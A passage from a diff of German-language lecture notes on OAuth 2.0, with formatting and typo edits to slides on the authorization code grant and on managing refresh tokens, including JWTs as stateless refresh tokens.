+	  Server zugreifen
 
 ![Authorization Code Grant](./static/code.png)
 
 ![Authorization Code Grant Part 2](./static/code2.png)
 
-Weitere Parameter des Authorization Requests im Schritt 2
 ![Parameters](./static/parameter.png)
 
 **Workflow, um einen abgelaufenen Token zu refreshen**
+
 ![Refresh](./static/refresh.png)
 
 **Erzeugen und Verwalten von Refresh Tokens**
@@ -1912,13 +2063,12 @@ Erzeugen von Refresh Token (Schritte 1, 2)
 
 - Refresh Token kann eine zufällige Zeichenkette sein
 
-Problem
-
-- Authorization Server muss dann speicher, welches Refresh Token er (für welchen Client) ausgestellt hat, um diesen in Schritt 7 des Diagramms der vorangegangenen Folie überprüfen zu können
-- Typischerweise werden solche Refresh Tokens serverseitig in einer Datenbank gespeichert
-- Server verwaltet somit einen Zustand in Form von Refresh Tokens
-  - Server ist stateful
-- Abhilfe durch JSON Web Tokens (JWT) als Refresh Token
-- Zustand ist dann in JWT enthalten
-- JWT Refresh Token muss nicht auf Server gespeichert werden
-- Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
+- **Problem**
+	- Authorization Server muss dann speichern, welches Refresh Token er (für welchen Client) ausgestellt hat, um diesen in Schritt 7 des Diagramms der vorangegangenen Folie überprüfen zu können
+	- Typischerweise werden solche Refresh Tokens serverseitig in einer Datenbank gespeichert
+	- Server verwaltet somit einen Zustand in Form von Refresh Tokens
+	  - Server ist stateful
+	- Abhilfe durch JSON Web Tokens (JWT) als Refresh Token
+	- Zustand ist dann in JWT enthalten
+	- JWT Refresh Token muss nicht auf Server gespeichert werden
+	- Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
